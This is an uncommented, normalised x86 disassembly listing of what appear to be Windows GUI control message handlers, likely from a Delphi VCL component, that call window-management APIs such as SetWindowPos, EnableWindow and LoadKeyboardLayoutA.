call sub_44c24c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x215 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_432e04
test al al
jne r-xdata
sub_432e8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432e04
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_432eb8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432e04
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_432ee4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_432f18
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x4 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffbe
call sub_44c24c
xor eax eax
mov al [ ebp - 0x11 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] ax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x215 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_432f18
test al al
jne r-xdata
sub_432fa0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432f18
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_432fcc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x8 ]
movsx ecx [ ecx + 0x6 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffc6
call sub_44c24c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb043
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_42df28
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
sub_433050
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
call sub_41a61c
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] al
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffb7
call sub_44c24c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_439a48
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4330bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb043
mov eax [ ebp - 0x4 ]
call sub_42df28
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov bx 0xffb7
call sub_44c24c
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_433118
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ca ] 0x0
je r-xdata
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x15 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
mov al [ ebp - 0x15 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
add [ edx + 0x178 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x178 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x178 ] 0x0
setl [ ebp - 0x16 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x178 ]
cdq
xor eax edx
sub eax edx
sub eax 0x78
mov edx [ ebp - 0x4 ]
mov [ edx + 0x178 ] eax
cmp [ ebp - 0x16 ] 0x0
je r-xdata
lea ecx [ ebp - 0x14 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffc4
call sub_44c24c
mov [ ebp - 0x15 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x178 ] 0x0
je r-xdata
lea ecx [ ebp - 0x14 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffc5
call sub_44c24c
mov [ ebp - 0x15 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
neg [ eax + 0x178 ]
sub_433210
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d2 ] 0x0
je r-xdata
mov al [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x11 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_433260
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
mov al [ ebp - 0x11 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x11 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_4332b0
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x42 ] 0x1
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax [ ebp - 0x10 ]
call sub_42df28
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4332b0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_433378
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
call sub_4332b0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14c ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax [ ebp - 0xc ]
call sub_42df28
test eax eax
jne r-xdata
sub_43342c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43345c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_43180c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4334a0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_43180c
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4334d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call RemovePropA
pop ecx
pop ecx
pop ebp
retn
sub_43351c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14c ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x168 ] 0x0
pop ecx
pop ecx
pop ebp
retn
sub_43354c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_433588
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_42b8f4
mov [ ebp - 0x6 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov al [ ebp - 0x6 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
cmp eax 0x0
jl r-xdata
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov dl [ ebp - 0x5 ]
mov bx 0xffd6
call sub_44c24c
or al [ ebp - 0x6 ]
mov [ ebp - 0x6 ] al
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov al [ ebp - 0x5 ]
and al [ ebp - 0x6 ]
jne r-xdata
sub_4335f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x44 ] 0x4
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov bx 0xffd6
call sub_44c24c
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_433628
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
mov bx 0xffd6
call sub_44c24c
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_433654
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax [ ebp - 0x4 ]
call sub_4308e4
pop ecx
pop ecx
pop ebp
retn
sub_43367c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42ebe8
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
mov dx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_4308e4
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_430fcc
sub_4336c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffc9
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42d26c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
call sub_44cf24
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x2c ]
call sub_44cf24
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_433740
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0xffc8
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_433760
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4313c8
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42ed4c
sub_43378c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x24 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4337b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x24 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_433838
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_431158
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x4
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43056c
pop ecx
pop ecx
pop ebp
retn
sub_433880
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x168 ]
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call SetWindowPos
pop ecx
pop ecx
pop ebp
retn
sub_4338bc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43056c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4c ]
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call EnableWindow
sub_43391c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42eb48
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x130 ]
call sub_40f388
mov dx 0xb009
mov eax [ ebp - 0x4 ]
call sub_4308e4
pop ecx
pop ecx
pop ebp
retn
sub_433958
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42eb30
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov dx 0xb008
mov eax [ ebp - 0x4 ]
call sub_4308e4
pop ecx
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ea2c
mov ecx eax
mov edx 0x30
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_4339a8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
call GetCapture
test eax eax
jne r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea eax [ ebp - 0xc ]
xor edx edx
call sub_42ac70
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_434714
mov ecx eax
mov edx 0x20
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_4339f4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
sub_433a38
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x10
je r-xdata
mov dx 0xb011
mov eax [ ebp - 0x4 ]
call sub_4308e4
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14c ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4345b4
sub_433a90
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov dl [ eax + 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_43491c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
setne dl
mov eax [ ebp - 0x4 ]
call sub_43491c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x160 ] 0x1
sub_433b58
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x4 ]
sub al 0x4
jb r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
call sub_42d89c
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42c3e4
lea edx [ ebp - 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43130c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
sub_433bd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x24 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_433c00
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42ec9c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430890
pop ecx
pop ecx
pop ebp
retn
sub_433c28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x4 ]
mov eax 0xb016
call sub_428ec0
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov bx 0xffdb
call sub_44c24c
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
